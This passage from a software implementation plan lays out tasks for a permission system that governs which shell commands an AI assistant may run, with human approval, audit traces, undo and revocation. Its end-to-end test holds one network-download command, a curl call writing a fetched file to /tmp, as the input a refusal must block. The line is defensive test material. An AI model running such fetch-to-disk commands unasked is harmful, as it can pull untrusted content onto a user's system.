- Produces: `agent.approvalRequested` gains `outOfScope: {cause, resource}`; `agent.approve` gains `expandScope: boolean`. An approval with `expandScope` widens the row's scopes and approves the call in ONE store write.

**Acceptance Criteria:**

- An ask caused by `row-scope` carries the resource, and answering it with `expandScope` widens the row and resumes the call atomically — a store failure leaves neither applied.
- Identical out-of-scope asks are deduplicated within a run: the second occurrence of the same `(effect, resource)` does not raise a second prompt.
- Repeated expansion asks are capped per run, and reaching the cap is stated in the run — never a silent stop.
- A declined expansion refuses that `(effect, resource)` for the rest of the run's life, asserted at both ends: refused from the decline until the run ends, asked again in the next run.
- `Cause: fence` never offers `expandScope`.

- [ ] **Step 1-6:** red test per criterion, implement, green, contract test over the wire, commit.

```bash
git commit -m "feat(transport): an out-of-scope ask can be answered by widening the row, once and boundedly (nocx-okdsm)"
```

---

### Task 8: `policy.setRule`, `policy.forgetRule`, and the renderer that reads rules

**Files:**

- Modify: `internal/transport/ws_policy.go`
- Create: `contracts/policy.setRule.schema.json`, `contracts/policy.forgetRule.schema.json`
- Modify: `contracts/policy.get.schema.json` — rules carry id, source, createdAt, evaluatorVersion
- Modify: `frontend/src/policy-client.ts`
- Test: `internal/transport/ws_policy_test.go`, `frontend/src/policy-client.test.ts`

**Depends on:** Tasks 5, 6.

**Acceptance Criteria:**

- `policy.setRule` writes one rule and `policy.forgetRule` removes one by id; neither rewrites the document, so a rule saved by the prompt a moment earlier survives a page gesture — the regression `nocx-39bly` recorded, asserted directly.
- `policy.get` carries every rule with its provenance, and `policy-client.ts` exposes them.
- Both methods have a schema and an `_OverTheWireConformsToContract` test.
- A refused write raises the danger toast and the surface re-reads. No local dirty state exists.

- [ ] **Step 1-6:** red, implement, green, contracts, commit.

```bash
git commit -m "feat(transport,frontend): a rule is written and forgotten one at a time, and the renderer can see them (nocx-takqr.3)"
```

---

### Task 9: The `Why` trace, computed where the decision is

**Files:**

- Modify: `internal/content/effectpolicy.go` — `EvaluateInvocation` records its steps
- Modify: `internal/transport/ws_policy.go` — a `policy.explain` method
- Create: `contracts/policy.explain.schema.json`
- Test: `internal/content/effectpolicy_test.go`, `internal/transport/ws_policy_test.go`

**Depends on:** Tasks 4, 5, 6.

**Interfaces:**

- Produces: `Verdict.Trace []TraceStep`, each `{kind, ruleID, effect, decision, detail}`, in the order the decision was taken.

**Acceptance Criteria:**

- The trace for a permitted call lists the rule that permitted it, the row consulted, and the resource verdict, in that order.
- A shadowed rule appears in the trace with the step that short-circuited it — a `refuse` row is read before rules, and the trace says so rather than implying the rule was consulted.
- The trace is not reconstructed anywhere in the renderer: a test greps `frontend/src` for the precedence words and finds none.

- [ ] **Step 1-6:** red, implement, green, contract, commit.

```bash
git commit -m "feat(content,transport): the decision explains itself, in the order it was taken (nocx-0ykkk)"
```

---

### Task 10: The receipt in the scrollback, and `Undo` that cannot lose an answer

**Files:**

- Modify: `frontend/src/agent-approval-prompt.tsx` and the scrollback entry it resolves into
- Test: `frontend/src/agent-approval-prompt.test.tsx`

**Depends on:** Task 8.

**Acceptance Criteria:**

- After a standing answer, the scrollback carries one line naming what was saved in the person's words, with `Undo` and `Manage permissions`.
- `Undo` targets the mutation id and fails loudly if the store moved underneath it — it never restores a snapshot, because an answer given between the save and the undo must not be discarded.
- An egress answer produces no receipt: it saves nothing.

- [ ] **Step 1-5:** red, implement, green, commit.

```bash
git commit -m "feat(frontend): a standing answer says so where it was given (nocx-0ykkk)"
```

---

### Task 11: The page, rebuilt on the trace

**Files:**

- Rewrite: `frontend/src/agent-policy-section.tsx` → `frontend/src/assistant-permissions-section.tsx`
- Modify: `frontend/src/settings.tsx`, `frontend/src/styles/components/`
- Test: `frontend/src/assistant-permissions-section.test.tsx`

**Depends on:** Tasks 8, 9.

**Acceptance Criteria:**

- Two sections: answers given (every rule and every row off its default, as a sentence, each with `Why`, `Change`, `Forget`), and questions not answered yet (live rows still on `ask`, each with `Answer this now`).
- `Why` renders the backend trace and nothing computed locally.
- `Change` offers the three answers and, for a row, the place picker — named places only, no free-form field and no scope-kind select.
- `Forget` previews what it releases before it is taken, naming the calls whose outcome changes.
- A rule needing confirmation is shown as inert with `Review` and `Forget`.
- The words "effect class", "resource scope" and "refuse" do not appear; no control names a tool. A test asserts each.
- Every control comes from `frontend/src/ui/`; the surface places kit components and never repaints them.

- [ ] **Step 1-6:** red per criterion, implement, green, commit.

```bash
git commit -m "feat(frontend): Assistant permissions answers questions instead of editing a matrix (nocx-0ykkk, nocx-takqr.3)"
```

---

### Task 12: Widening from a classified witness, and writing a refusal

**Files:**

- Modify: `frontend/src/assistant-permissions-section.tsx`
- Modify: `internal/transport/ws_policy.go` — a `policy.classify` method that parses and classifies a command WITHOUT running it
- Create: `contracts/policy.classify.schema.json`
- Test: as above, plus `internal/transport/ws_policy_test.go`

**Depends on:** Task 11.

**Acceptance Criteria:**

- `+ Allow a command…` takes a typed command, classifies it without executing it, shows what the widened rule would and would not match, and only then saves a `Program` rule carrying that effect.
- `policy.classify` cannot execute anything — asserted by a test that a command with a side effect leaves no trace.
- `+ Write a refusal` writes a `HasFeature` or `Exact` refusal and never a permit.
- A permit cannot be typed from nothing anywhere on the page.

- [ ] **Step 1-6:** red, implement, green, contract, commit.

```bash
git commit -m "feat(frontend,transport): a permission is widened from a command that was read, never from one that was run (nocx-6to7g)"
```

---

### Task 13: Revocation has a time

**Files:**

- Modify: `internal/transport/ws_policy.go`, `frontend/src/assistant-permissions-section.tsx`
- Test: `internal/transport/ws_policy_test.go`

**Depends on:** Task 8.

**Acceptance Criteria:**

- A change or a forget affecting live runs says how many and offers "apply to future runs" against "also stop the runs using it".
- Choosing future-only leaves the running work alone, asserted at both ends: the run finishes under the old answer, the next run gets the new one.
- Choosing to stop terminates those runs through the existing terminalization path, with the reason naming the revoked answer.

- [ ] **Step 1-5:** red, implement, green, commit.

```bash
git commit -m "feat(transport,frontend): revoking an answer says what happens to the work already running (nocx-0ykkk)"
```

---

### Task 14: The end-to-end check

**Files:**

- Create: `e2e/assistant-permissions.spec.ts`

**Depends on:** Tasks 11, 12.

**Acceptance Criteria:** the spec's happy path, watched end to end through the real backend (`cmd/nocx-server`):

- The assistant proposes `df -h`; the person answers **Allow always**; the scrollback says what was saved.
- A second question in a new session is not asked.
- Settings → Assistant permissions shows the answer; widening it to _any `df` command_ makes `df --output=source` run unasked.
- A refusal written for _any command that writes a file to a path named by an option_ refuses `curl -o /tmp/proof https://example.com`, and the page names which answer refused it.
- Forgetting both makes the assistant ask again.

- [ ] **Step 1: Write the spec, run it red, implement nothing** — every behaviour it needs already landed. A red step here is a defect in an earlier task, not a reason to write product code in the e2e task.

- [ ] **Step 2: Commit**

```bash
git commit -m "test(e2e): a person answers a question once and can take the answer back (nocx-0ykkk)"
```

---

## Dependency order

```
1 ──────────────► 5 ──► 6 ──► 8 ──► 10
                  ▲            ├──► 13
2 ──► 3 ──► 4 ────┘            └──► 11 ──► 12 ──► 14
            └──► 7                   ▲
            └────────────► 9 ────────┘
```

Ready with nothing before them: **1, 2**. Task 3 opens once 2 lands, and the front stays at about three from there.
